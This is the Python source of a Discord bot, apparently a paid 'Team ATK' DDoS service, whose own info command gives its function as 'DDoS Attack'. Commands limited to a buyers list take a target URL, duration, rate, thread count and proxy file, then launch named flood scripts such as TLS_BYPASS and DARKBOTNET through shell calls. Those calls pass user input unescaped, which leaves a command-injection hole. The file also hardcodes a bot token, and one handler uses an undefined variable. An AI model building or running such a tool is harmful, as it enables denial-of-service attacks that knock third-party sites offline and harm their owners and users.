# coding: iso-8859-1 -*-
# -*- encoding: utf-8 -*-
import discord,time
from discord import File
from ping3 import ping
from discord.utils import escape_mentions
import aiohttp
import asyncio
import random
from random import choice
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import psutil
token = "MTExODE2OTMxNTU3Mzc4MDUzMA.GVi2Az.NckX9Fw2CdANT2ptu__qMsUYdif9PrAzbAc4GU"
buyers = [1101027355696304128, 1137003715656687656]
admins = [1101027355696304128, 1137003715656687656]
ownerList = [1101027355696304128, 1137003715656687656]

prefix = "."
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=int(100000000))
@bot.event
async def on_connect():
    print(f"Connecting Bot : {bot.user}")
    time.sleep(1.0)
    print("Success, Bot Is Online !!!! Owner:CofZZ & Asep")
	





#add a buyer to the buyers list.
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} Is already a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.append(buyer)
        embed = discord.Embed(title="Buyer Added", description=f"{buyer} has been added to the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete a buyer from the buyers list
@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer not in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is not a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.remove(buyer)
        embed = discord.Embed(title="Buyer Removed", description=f"{buyer} has been removed from the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#add an admin to the admins list
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(title="Administrator Error", description=f"{admin} is already an Admin!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="Administrator Error", description=f"Please provide an Admins ID", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(title="Administrator Added", description=f"{admin} has been added to the Admin list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete an admin from the admins list
@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="Only Owner Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin not in admins:
	    embed = discord.Embed(title="Invalid ID", description="This ID doesn't belong to an existing Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    elif admin is None:
	    embed = discord.Embed(title="Invalid ID", description="Please provide an ID of a *current* Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(title="Administrator Removed", description=f"{admin} has been removed...", color=0xa30000)
        await ctx.send(embed=embed)
        
        
        
        
     
     
     
@bot.command()
async def help(ctx):
	if ctx.author.id not in buyers:
		embeds = discord.Embed(title=" **TEAM ATK** ", color=0xfcb103)
		embeds.add_field(name="**Warning**",value="You Don't Have Permission To Use This Command !")
		embeds.set_footer(text=f"~>� Owner : CofZZ & Asep | {ctx.author.name}")
		
		
		await ctx.reply(embed=embeds)
	else:
		embed = discord.Embed(title=" **TEAM ATK** ", description="[?] **HELP MENU** [?]�", color=discord.Colour.random())
		embed.set_author(name="Team ATK Bot V1", icon_url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
		embed.add_field(name="**User_info**", value="`View User Information`")
		embed.add_field(name="**Bot_info**", value="`View Bot Information`")
		embed.add_field(name="**Ping**", value="`Ping Website Status`")
		embed.add_field(name="**Methods**", value="`Show All Methods DDoS`")
		embed.add_field(name="**Commands**", value="`Show All Commands To DDoS`")
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}")
		
		await ctx.send(embed=embed)
	
	
	
	
	
	
@bot.command()
async def Userinfo(ctx, user:discord.Member=None):
	embed = discord.Embed(color=user.color)
	embed.set_author(name=f"User Info - {user}")
	embed.set_thumbnail(url=user.avatar.url)
	embed.add_field(name="ID :", value=user.id)
	embed.add_field(name="Name :", value=user.display_name)
	embed.add_field(name="Created at :", value=user.created_at)
	embed.add_field(name="Joined at :", value=user.joined_at)
	embed.add_field(name="Bot ?", value=user.bot)
	embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Info User : {user}", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
@bot.command()
async def vpsinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/originals/8f/f2/10/8ff210a59c7a8eadc434ec303f7a86f5.jpg")
	embed.set_author(name="Vps Info - AtK Team")
	embed.add_field(name="Total RAM GB", value=round(psutil.virtual_memory()[0]/2**30, 2))
	embed.add_field(name="RAM Usage %:", value=psutil.virtual_memory()[2])
	embed.add_field(name="CPU Usage %:", value=psutil.cpu_percent(1))
	embed.set_footer(text="~>� Owner : CofZZ & Asep | Info Bot :  Atk Team ", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)	
	
	
@bot.command()
async def Botinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/originals/8f/f2/10/8ff210a59c7a8eadc434ec303f7a86f5.jpg")
	embed.set_author(name="Bot Info - AtK Team")
	embed.add_field(name="ID :", value="1015483556501409792")
	embed.add_field(name="Name :", value="AtK Bots")
	embed.add_field(name="Bot Owner :", value="CofZZ & Asep")
	embed.add_field(name="Function :", value="DDoS Attack")
	embed.add_field(name="Bot ?", value="True")
	embed.set_footer(text="~>� Owner : CofZZ & Asep | Info Bot :  AtK Team ", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
	
	
	
	
	
@bot.command()
async def ping(ctx, address: str) -> None:
        """
        Performs a HTTP request to the specified address
        :param ctx: commands.Context
        :param address: Address to make request to
        :return: HTTP status code
        """
        if not address.startswith("http"):
            address = f"http://{address}"

        address = escape_mentions(address)

        async with aiohttp.ClientSession(
        ) as session:
            try:
                async with session.get(address) as res:
                    await ctx.reply(
                        f"Recieved response code: {res.status} ({res.reason})"
                    )
            except asyncio.TimeoutError:
                await ctx.reply(f"Request timed out after some seconds")
            except aiohttp.ClientError:
                await ctx.reply(f"Could not establish a connection to {address}")

	
	
	
	
	
	
	
	
@bot.command()
async def Methods(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\n```")
		embet.add_field(name="**Methods Layer7**", value="```\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\nHTTP_CONNECT\nTLS_FLOODER\nTLS_V2\nDARKBOTNET\nBYPASS_2\nBOT\n```")
		embet.set_footer(text=f"~>� Owner : CofZZ & Asep | All Methods Show")
		
		await ctx.channel.send(embed=embet)
	
	
	
	
	
	
@bot.command()
async def Proxy(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Command !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embet.add_field(name="**Proxy**", value="```alive2.txt, alive1.txt, sux.txt```")
		embet.set_footer(text=f"~>� Owner : CofZZ & Asep | All Proxy Show")
		
		await ctx.channel.send(embed=embet)
	
	
	
	
	
	
@bot.command()
async def Commands(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
		embed.add_field(name="**PROXY**", value="```.Proxy```")
		embed.add_field(name="**TCP_KILL**", value="```.TCP_KILL [url/ip] [time] [port]```")
		embed.add_field(name="**COFZ_TLS**", value="```.COFZ_TLS [url] [time] [rate] [thread] [proxy]```")
		embed.add_field(name="**TLS_BYPASS**", value="```.TLS_BYPASS [url] [time] [rate] [thread]```")
		embed.add_field(name="**HTTP_CONNECT**", value="```.HTTP_CONNECT [url] [port] [connect 1 - 9999]  [thread] [time]```")
		embed.add_field(name="**TLS_FLOODER**", value="```.TLS-FLOODER [url] [time] [rate] [thread] [proxy]```")
		embed.add_field(name="**TLS_V2**", value="```.TLS_V2 [url] [time] [rate] [thread] [proxy]```")
		embed.add_field(name="**DARKBOTNET**", value="```.DARKBOTNET [url] [time] [rate] [thread] [proxy]```")
		embed.add_field(name="**BYPASS_2**", value="```.BYPASS_2 [url] [time] [rate] [thread] [proxy]```")
		embed.add_field(name="**BOT**", value="```.BOT [url] [time] [rate] [thread] [proxy]```")
		embed.set_footer(text="~>� Owner : CofZZ & Asep | All Methods Command", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		
		
		
@bot.command()
async def TCP_KILL(ctx, url, time, port):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`TCP_KILL`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Port**", value=f"`{port}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node tcp-kill.js {url} {time} {port}")
		
		
@bot.command()
async def COFZ_TLS(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`COFZ_TLS`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node COFZ-TLS.js {url} {time} {rate} {thread} {proxy}")
		

@bot.command()
async def TLS_BYPASS(ctx, url, time, rate, thread):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`TLS_BYPASS`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`alive2.txt`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node TLS-BYPASS.js {url} {time} {rate} {thread}")

@bot.command()
async def HTTP_CONNECT(ctx, url, port, connect, thread, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HTTP_CONNECT`")
		embed.add_field(name="**Port**", value=f"`{port}")
		embed.add_field(name="**Connect**", value=f"`{conct}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Time**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node HTTP-CONNECTv2.js {url} {port} {connect} {thread} {time}")
				
@bot.command()
async def TLS_FLOODER(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`TLS_FLOODER`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node TLS-FLOODER.js {url} {time} {rate} {thread} {proxy}")
					
@bot.command()
async def TLS_V2(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`TLS_V2`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node TLS-V2.js {url} {time} {rate} {thread} {proxy}")
					
	
@bot.command()
async def BYPASS_2(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`BYPASS_2`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node bypass_2.js {url} {time} {rate} {thread} {proxy}")
						
	
@bot.command()
async def DARKBOTNET(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`DARKBOTNET`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node DarkBotnet.js {url} {time} {rate} {thread} {proxy}")
						
	
@bot.command()
async def BOT(ctx, url, time, rate, thread, proxy):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"~>� Owner : CofZZ & Asep | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`BOT`")
		embed.add_field(name="**Time**", value=f"`{time}")
		embed.add_field(name="**Rate**", value=f"`{rate}`")
		embed.add_field(name="**Thread**", value=f"`{thread}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"~>� Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node BOT.js {url} {time} {rate} {thread} {proxy}")
							
	
	

		
bot.run(token)
